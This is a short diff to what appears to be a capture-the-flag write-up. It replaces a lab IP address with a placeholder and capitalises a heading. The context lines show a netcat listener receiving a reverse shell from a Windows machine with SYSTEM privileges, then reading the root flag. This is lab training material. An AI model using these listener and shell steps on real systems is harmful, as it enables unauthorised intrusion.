@@ -396,7 +396,7 @@ Connect to nc opened earlier:
 ```
 nc -lnvp 4443
 Listening on 0.0.0.0 4443
-Connection received on 10.64.147.216 49379
+Connection received on <target-IP> 49379
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
@@ -405,7 +405,7 @@ whoami
 nt authority\system
 ```
 
-## Q4: get root flag
+## Q4: Get root flag
 Answer
 ```
 C:\Users\Administrator\Desktop>type root.txt
